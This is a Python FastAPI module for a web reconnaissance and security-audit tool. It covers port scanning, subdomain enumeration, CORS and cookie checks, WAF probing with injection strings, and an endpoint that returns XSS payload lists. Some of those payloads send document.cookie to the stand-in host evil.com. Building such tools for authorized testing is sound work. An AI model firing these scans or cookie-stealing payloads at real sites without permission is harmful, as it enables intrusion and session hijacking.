from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
import httpx
import socket
import re
import json
import asyncio
from app.common.logger import get_logger

logger = get_logger("recon_tools")

router = APIRouter(prefix="/api/recon", tags=["Reconnaissance Tools"])


class TargetRequest(BaseModel):
    target: str


class SecurityHeaderRequest(BaseModel):
    url: str


def _handle_req_error(e, action):
    msg = str(e) or type(e).__name__
    if isinstance(e, httpx.TimeoutException):
        msg = "请求超时，目标响应过慢或网络不可达"
    elif isinstance(e, httpx.ConnectError):
        msg = "无法连接目标服务器"
    logger.error(f"{action}失败: {type(e).__name__}: {e}")
    raise HTTPException(status_code=502, detail=f"{action}失败: {msg}")


@router.post("/whois")
async def whois_lookup(req: TargetRequest):
    try:
        domain = req.target.replace("http://", "").replace("https://", "").split("/")[0]
        import subprocess
        result = subprocess.run(
            ["nslookup", "-type=ANY", domain],
            capture_output=True, text=True, timeout=15, encoding="utf-8", errors="replace"
        )
        whois_data = {"domain": domain, "dns_records": result.stdout}
        try:
            addrs = socket.getaddrinfo(domain, None)
            ips = list(set(addr[4][0] for addr in addrs))
            whois_data["resolved_ips"] = ips
        except socket.gaierror:
            whois_data["resolved_ips"] = []
        return {"status": "success", "data": whois_data}
    except Exception as e:
        logger.error(f"WHOIS查询失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/dns")
async def dns_lookup(req: TargetRequest):
    try:
        domain = req.target.replace("http://", "").replace("https://", "").split("/")[0]
        records = {"domain": domain, "A": [], "AAAA": [], "MX": [], "NS": [], "TXT": []}
        try:
            records["A"] = list(set(
                addr[4][0] for addr in socket.getaddrinfo(domain, None, socket.AF_INET)
            ))
        except socket.gaierror:
            pass
        try:
            import subprocess
            ns_result = subprocess.run(
                ["nslookup", "-type=NS", domain],
                capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace"
            )
            for line in ns_result.stdout.split("\n"):
                if "nameserver" in line.lower() or "ns " in line.lower():
                    ns = line.split()[-1].rstrip(".")
                    if ns and ns != domain:
                        records["NS"].append(ns)
        except Exception:
            pass
        try:
            import subprocess
            mx_result = subprocess.run(
                ["nslookup", "-type=MX", domain],
                capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace"
            )
            for line in mx_result.stdout.split("\n"):
                if "mail exchanger" in line.lower():
                    mx = line.split()[-1].rstrip(".")
                    if mx:
                        records["MX"].append(mx)
        except Exception:
            pass
        return {"status": "success", "data": records}
    except Exception as e:
        logger.error(f"DNS查询失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/security-headers")
async def check_security_headers(req: SecurityHeaderRequest):
    url = req.url
    if not url.startswith("http"):
        url = "http://" + url
    try:
        async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.ConnectError:
        try:
            url_https = url.replace("http://", "https://")
            async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
                resp = await client.get(url_https)
            url = url_https
        except Exception as e2:
            _handle_req_error(e2, "安全头检测")
    except Exception as e:
        _handle_req_error(e, "安全头检测")

    headers = resp.headers
    security_headers = {
        "Strict-Transport-Security": {
            "name": "HSTS (Strict-Transport-Security)",
            "value": headers.get("strict-transport-security", ""),
            "present": "strict-transport-security" in headers,
            "description": "强制使用HTTPS连接，防止降级攻击和Cookie劫持",
            "severity": "High" if "strict-transport-security" not in headers else "Info",
        },
        "Content-Security-Policy": {
            "name": "CSP (Content-Security-Policy)",
            "value": headers.get("content-security-policy", ""),
            "present": "content-security-policy" in headers,
            "description": "限制页面可加载的资源来源，防止XSS和数据注入攻击",
            "severity": "High" if "content-security-policy" not in headers else "Info",
        },
        "X-Frame-Options": {
            "name": "X-Frame-Options",
            "value": headers.get("x-frame-options", ""),
            "present": "x-frame-options" in headers,
            "description": "防止页面被嵌入iframe，防御点击劫持攻击",
            "severity": "Medium" if "x-frame-options" not in headers else "Info",
        },
        "X-Content-Type-Options": {
            "name": "X-Content-Type-Options",
            "value": headers.get("x-content-type-options", ""),
            "present": "x-content-type-options" in headers,
            "description": "阻止浏览器MIME类型嗅探，防止内容类型混淆攻击",
            "severity": "Medium" if "x-content-type-options" not in headers else "Info",
        },
        "X-XSS-Protection": {
            "name": "X-XSS-Protection",
            "value": headers.get("x-xss-protection", ""),
            "present": "x-xss-protection" in headers,
            "description": "启用浏览器内置XSS过滤器（已弃用，推荐使用CSP）",
            "severity": "Low" if "x-xss-protection" not in headers else "Info",
        },
        "Referrer-Policy": {
            "name": "Referrer-Policy",
            "value": headers.get("referrer-policy", ""),
            "present": "referrer-policy" in headers,
            "description": "控制Referer头信息泄露，保护用户隐私",
            "severity": "Low" if "referrer-policy" not in headers else "Info",
        },
        "Permissions-Policy": {
            "name": "Permissions-Policy",
            "value": headers.get("permissions-policy", ""),
            "present": "permissions-policy" in headers,
            "description": "限制浏览器功能（摄像头、麦克风、地理位置等）的使用权限",
            "severity": "Low" if "permissions-policy" not in headers else "Info",
        },
    }
    missing_count = sum(1 for v in security_headers.values() if not v["present"])
    high_issues = [v for v in security_headers.values() if v["severity"] == "High"]
    score = max(0, 100 - missing_count * 12 - len(high_issues) * 10)
    return {
        "status": "success",
        "url": str(resp.url),
        "status_code": resp.status_code,
        "server": headers.get("server", "Unknown"),
        "security_headers": security_headers,
        "score": score,
        "missing_count": missing_count,
        "summary": f"安全评分: {score}/100, 缺失 {missing_count} 项安全头",
    }


@router.post("/port-check")
async def quick_port_check(req: TargetRequest):
    try:
        host = req.target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
                        1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                result = sock.connect_ex((host, port))
                if result == 0:
                    service_map = {
                        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
                        993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
                        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
                        6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
                        9200: "Elasticsearch", 27017: "MongoDB"
                    }
                    open_ports.append({"port": port, "service": service_map.get(port, "Unknown")})
                sock.close()
            except Exception:
                pass
        return {"status": "success", "host": host, "open_ports": open_ports, "total_checked": len(common_ports)}
    except Exception as e:
        logger.error(f"端口检测失败: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/cors-check")
async def check_cors(req: SecurityHeaderRequest):
    url = req.url
    if not url.startswith("http"):
        url = "http://" + url
    try:
        origin = "https://evil-cors-test.com"
        async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
            resp = await client.get(url, headers={"Origin": origin})
        acao = resp.headers.get("access-control-allow-origin", "")
        acac = resp.headers.get("access-control-allow-credentials", "")
        issues = []
        if acao == "*":
            issues.append({"severity": "High", "detail": "CORS允许任意来源(*)，存在跨域数据泄露风险"})
        elif acao == origin:
            issues.append({"severity": "Critical", "detail": f"CORS反射任意Origin({origin})，存在严重跨域攻击风险"})
        if acac.lower() == "true" and acao:
            issues.append({"severity": "Critical", "detail": "CORS允许携带凭证且开放跨域，可窃取用户敏感数据"})
        if not acao:
            issues.append({"severity": "Info", "detail": "未配置CORS头，跨域请求将被浏览器阻止"})
        return {
            "status": "success", "url": url,
            "access_control_allow_origin": acao,
            "access_control_allow_credentials": acac,
            "issues": issues,
            "vulnerable": len([i for i in issues if i["severity"] in ("Critical", "High")]) > 0,
        }
    except Exception as e:
        _handle_req_error(e, "CORS检测")


@router.post("/cookie-check")
async def check_cookies(req: SecurityHeaderRequest):
    url = req.url
    if not url.startswith("http"):
        url = "http://" + url
    try:
        async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
        set_cookie_headers = resp.headers.get_list("set-cookie")
        if not set_cookie_headers:
            return {"status": "success", "url": url, "cookies": [], "summary": "响应中无Set-Cookie头"}
        cookies = []
        for raw in set_cookie_headers:
            parts = raw.split(";")
            name_value = parts[0].strip()
            name = name_value.split("=")[0].strip()
            value = name_value.split("=", 1)[1].strip() if "=" in name_value else ""
            flags = {
                "HttpOnly": any("httponly" in p.lower() for p in parts),
                "Secure": any("secure" in p.lower() for p in parts),
                "SameSite": "",
            }
            for p in parts:
                p_lower = p.strip().lower()
                if p_lower.startswith("samesite"):
                    flags["SameSite"] = p.strip().split("=", 1)[1].strip() if "=" in p else ""
            issues = []
            if not flags["HttpOnly"] and name.lower() not in ("csrf_token", "_csrf"):
                issues.append({"severity": "Medium", "detail": f"Cookie '{name}' 缺少HttpOnly标志，可被JavaScript读取"})
            if not flags["Secure"]:
                issues.append({"severity": "Medium", "detail": f"Cookie '{name}' 缺少Secure标志，可能在HTTP连接中传输"})
            if not flags["SameSite"]:
                issues.append({"severity": "Low", "detail": f"Cookie '{name}' 缺少SameSite属性，存在CSRF风险"})
            cookies.append({"name": name, "value": value[:20] + "..." if len(value) > 20 else value, "flags": flags, "issues": issues})
        all_issues = [i for c in cookies for i in c["issues"]]
        return {
            "status": "success", "url": url, "cookies": cookies,
            "total_cookies": len(cookies), "total_issues": len(all_issues),
            "summary": f"发现 {len(cookies)} 个Cookie, {len(all_issues)} 个安全问题",
        }
    except Exception as e:
        _handle_req_error(e, "Cookie检测")


@router.post("/tech-detect")
async def detect_technology(req: SecurityHeaderRequest):
    url = req.url
    if not url.startswith("http"):
        url = "http://" + url
    try:
        async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
        headers = resp.headers
        body = resp.text[:5000]
        techs = []
        server = headers.get("server", "")
        if server:
            techs.append({"name": "Web Server", "value": server, "category": "Infrastructure"})
            if "nginx" in server.lower():
                techs.append({"name": "Nginx", "value": server, "category": "Web Server"})
            elif "apache" in server.lower():
                techs.append({"name": "Apache", "value": server, "category": "Web Server"})
            elif "iis" in server.lower():
                techs.append({"name": "Microsoft IIS", "value": server, "category": "Web Server"})
            elif "cloudflare" in server.lower():
                techs.append({"name": "Cloudflare", "value": "CDN/WAF", "category": "Security"})
        powered_by = headers.get("x-powered-by", "")
        if powered_by:
            techs.append({"name": "X-Powered-By", "value": powered_by, "category": "Framework"})
            if "express" in powered_by.lower():
                techs.append({"name": "Express.js", "value": "Node.js Framework", "category": "Framework"})
            elif "php" in powered_by.lower():
                techs.append({"name": "PHP", "value": powered_by, "category": "Language"})
            elif "asp.net" in powered_by.lower():
                techs.append({"name": "ASP.NET", "value": powered_by, "category": "Framework"})
        if "x-aspnet-version" in headers:
            techs.append({"name": "ASP.NET", "value": headers["x-aspnet-version"], "category": "Framework"})
        if "x-drupal-cache" in headers:
            techs.append({"name": "Drupal", "value": "CMS", "category": "CMS"})
        if "x-generator" in headers:
            gen = headers["x-generator"]
            techs.append({"name": "Generator", "value": gen, "category": "CMS"})
        if '<meta name="generator"' in body.lower():
            match = re.search(r'content="([^"]+)"', body, re.IGNORECASE)
            if match:
                techs.append({"name": "Meta Generator", "value": match.group(1), "category": "CMS"})
        if "wp-content" in body or "wp-includes" in body:
            techs.append({"name": "WordPress", "value": "Detected via paths", "category": "CMS"})
        if "jquery" in body.lower():
            techs.append({"name": "jQuery", "value": "JavaScript Library", "category": "JavaScript"})
        if "react" in body.lower() and ("react-dom" in body.lower() or "__react" in body.lower()):
            techs.append({"name": "React", "value": "JavaScript Framework", "category": "JavaScript"})
        if "bootstrap" in body.lower():
            techs.append({"name": "Bootstrap", "value": "CSS Framework", "category": "CSS"})
        if "tailwind" in body.lower():
            techs.append({"name": "Tailwind CSS", "value": "CSS Framework", "category": "CSS"})
        if headers.get("content-security-policy"):
            techs.append({"name": "CSP", "value": "Configured", "category": "Security"})
        if headers.get("strict-transport-security"):
            techs.append({"name": "HSTS", "value": "Enabled", "category": "Security"})
        return {
            "status": "success", "url": url, "technologies": techs,
            "total_detected": len(techs), "summary": f"检测到 {len(techs)} 项技术栈信息",
        }
    except Exception as e:
        _handle_req_error(e, "技术指纹检测")


@router.post("/subdomain-enum")
async def enumerate_subdomains(req: TargetRequest):
    domain = req.target.replace("http://", "").replace("https://", "").split("/")[0]
    subdomains = []
    try:
        import subprocess
        result = subprocess.run(
            ["nslookup", "-type=ANY", domain],
            capture_output=True, text=True, timeout=15, encoding="utf-8", errors="replace"
        )
        for line in result.stdout.split("\n"):
            line = line.strip()
            if "name =" in line.lower() or "name=" in line.lower():
                match = re.search(r'name\s*=\s*(\S+)', line, re.IGNORECASE)
                if match:
                    sd = match.group(1).rstrip(".")
                    if sd and sd != domain:
                        subdomains.append(sd)
    except Exception:
        pass
    common_subs = ["www", "mail", "ftp", "admin", "api", "dev", "staging", "test", "blog", "shop"]
    for sub in common_subs:
        fqdn = f"{sub}.{domain}"
        try:
            socket.getaddrinfo(fqdn, None)
            if fqdn not in subdomains:
                subdomains.append(fqdn)
        except socket.gaierror:
            pass
    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            crt_resp = await client.get(f"https://crt.sh/?q=%.{domain}&output=json")
            if crt_resp.status_code == 200:
                crt_data = crt_resp.json()
                for entry in crt_data:
                    name = entry.get("name_value", "")
                    for n in name.split("\n"):
                        n = n.strip().rstrip(".")
                        if n and n != domain and n not in subdomains:
                            subdomains.append(n)
    except Exception:
        pass
    subdomains = list(set(subdomains))[:50]
    return {
        "status": "success", "domain": domain, "subdomains": subdomains,
        "total_found": len(subdomains), "summary": f"发现 {len(subdomains)} 个子域名",
    }


@router.post("/waf-detect")
async def detect_waf(req: SecurityHeaderRequest):
    url = req.url
    if not url.startswith("http"):
        url = "http://" + url
    try:
        waf_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
            "AWS WAF": ["awselb", "x-amz-cf-id", "x-amzn-requestid"],
            "Akamai": ["akamai", "x-akamai-transformed", "x-cache-akamai"],
            "Imperva": ["x-iinfo", "incap_ses", "visid_incap"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "F5 BIG-IP": ["bigip", "x-wa-info", "f5"],
            "Fortinet": ["fortinet", "fortiwaf"],
        }
        async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
            normal_resp = await client.get(url)
            attack_resp = await client.get(
                url, params={"q": "<script>alert(1)</script>' OR 1=1--"},
                headers={"User-Agent": "sqlmap/1.5"},
            )
        detected_wafs = []
        all_headers_lower = {k.lower(): v for k, v in normal_resp.headers.items()}
        all_headers_lower.update({k.lower(): v for k, v in attack_resp.headers.items()})
        for waf_name, sigs in waf_signatures.items():
            for sig in sigs:
                if any(sig.lower() in k or sig.lower() in v for k, v in all_headers_lower.items()):
                    detected_wafs.append({"name": waf_name, "evidence": sig})
                    break
        server = normal_resp.headers.get("server", "").lower()
        if "cloudflare" in server and not any(w["name"] == "Cloudflare" for w in detected_wafs):
            detected_wafs.append({"name": "Cloudflare", "evidence": "Server header"})
        if attack_resp.status_code == 403 and not detected_wafs:
            detected_wafs.append({"name": "Unknown WAF", "evidence": "Attack request blocked (403)"})
        if not detected_wafs:
            return {"status": "success", "url": url, "waf_detected": False, "wafs": [], "summary": "未检测到WAF防护"}
        return {
            "status": "success", "url": url, "waf_detected": True, "wafs": detected_wafs,
            "summary": f"检测到WAF: {', '.join(w['name'] for w in detected_wafs)}",
        }
    except Exception as e:
        _handle_req_error(e, "WAF检测")


@router.post("/xss-payloads")
async def generate_xss_payloads(req: TargetRequest):
    context = req.target.lower()
    payloads = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
        ],
        "attribute": [
            '" onmouseover="alert(\'XSS\')"',
            "' onfocus='alert(\"XSS\")' autofocus='",
            '" onfocus="alert(\'XSS\')" autofocus="',
            "`` onmouseover=alert('XSS')",
        ],
        "dom_based": [
            "#<img src=x onerror=alert('XSS')>",
            "#\"><script>alert('XSS')</script>",
            "javascript:document.location='http://evil.com/?c='+document.cookie",
        ],
        "filter_bypass": [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img/src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert&lpar;'XSS'&rpar;>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
        ],
        "advanced": [
            "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
            "<img src=x onerror=\"new Image().src='http://evil.com/?c='+document.cookie\">",
            "<svg><animate onbegin=alert('XSS') attributeName=x>",
            "<input onfocus=alert('XSS') autofocus>",
        ],
    }
    if "dom" in context or "url" in context:
        selected = payloads["dom_based"] + payloads["basic"]
    elif "filter" in context or "bypass" in context or "waf" in context:
        selected = payloads["filter_bypass"] + payloads["advanced"]
    elif "attr" in context or "attribute" in context:
        selected = payloads["attribute"] + payloads["basic"]
    else:
        selected = payloads["basic"] + payloads["filter_bypass"][:3]
    return {
        "status": "success", "context": context, "payloads": payloads, "recommended": selected,
        "total_payloads": sum(len(v) for v in payloads.values()),
        "summary": f"生成 {sum(len(v) for v in payloads.values())} 个XSS测试Payload",
    }


@router.post("/full-audit")
async def full_security_audit(req: SecurityHeaderRequest):
    url = req.url
    if not url.startswith("http"):
        url = "http://" + url
    domain = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    results = {}
    tasks = {
        "security_headers": _audit_headers(url),
        "cors": _audit_cors(url),
        "cookies": _audit_cookies(url),
        "tech": _audit_tech(url),
        "ports": _audit_ports(domain),
        "waf": _audit_waf(url),
    }
    for name, task in tasks.items():
        try:
            results[name] = await task
        except Exception as e:
            results[name] = {"error": str(e) or type(e).__name__}
    scores = []
    if "security_headers" in results and "score" in results["security_headers"]:
        scores.append(results["security_headers"]["score"])
    if "cors" in results and results["cors"].get("vulnerable"):
        scores.append(30)
    elif "cors" in results and not results["cors"].get("error"):
        scores.append(90)
    if "cookies" in results and results["cookies"].get("total_issues", 0) > 0:
        scores.append(max(20, 80 - results["cookies"]["total_issues"] * 15))
    elif "cookies" in results and not results["cookies"].get("error"):
        scores.append(90)
    if "waf" in results and results["waf"].get("waf_detected"):
        scores.append(85)
    elif "waf" in results and not results["waf"].get("error"):
        scores.append(50)
    overall = int(sum(scores) / len(scores)) if scores else 0
    return {
        "status": "success", "url": url, "overall_score": overall,
        "results": results, "summary": f"综合安全评分: {overall}/100",
    }


async def _audit_headers(url):
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
        resp = await client.get(url)
    headers = resp.headers
    checks = ["strict-transport-security", "content-security-policy", "x-frame-options",
              "x-content-type-options", "x-xss-protection", "referrer-policy", "permissions-policy"]
    present = [h for h in checks if h in headers]
    score = int(len(present) / len(checks) * 100)
    return {"score": score, "present": present, "missing": [h for h in checks if h not in headers]}


async def _audit_cors(url):
    origin = "https://evil-test.com"
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
        resp = await client.get(url, headers={"Origin": origin})
    acao = resp.headers.get("access-control-allow-origin", "")
    vulnerable = acao == origin or acao == "*"
    return {"vulnerable": vulnerable, "access_control_allow_origin": acao}


async def _audit_cookies(url):
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
        resp = await client.get(url)
    set_cookies = resp.headers.get_list("set-cookie")
    issues = 0
    for raw in set_cookies:
        parts = raw.split(";")
        if not any("httponly" in p.lower() for p in parts):
            issues += 1
        if not any("secure" in p.lower() for p in parts):
            issues += 1
    return {"total_cookies": len(set_cookies), "total_issues": issues}


async def _audit_tech(url):
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
        resp = await client.get(url)
    server = resp.headers.get("server", "Unknown")
    powered = resp.headers.get("x-powered-by", "")
    return {"server": server, "powered_by": powered}


async def _audit_ports(domain):
    common = [21, 22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017]
    open_ports = []
    for port in common:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((domain, port)) == 0:
                open_ports.append(port)
            sock.close()
        except Exception:
            pass
    return {"open_ports": open_ports, "total_checked": len(common)}


async def _audit_waf(url):
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
        resp = await client.get(url, params={"q": "<script>alert(1)</script>"})
    if resp.status_code == 403:
        return {"waf_detected": True, "wafs": [{"name": "Detected", "evidence": "403 on attack"}]}
    server = resp.headers.get("server", "").lower()
    if "cloudflare" in server:
        return {"waf_detected": True, "wafs": [{"name": "Cloudflare", "evidence": "Server header"}]}
    return {"waf_detected": False, "wafs": []}
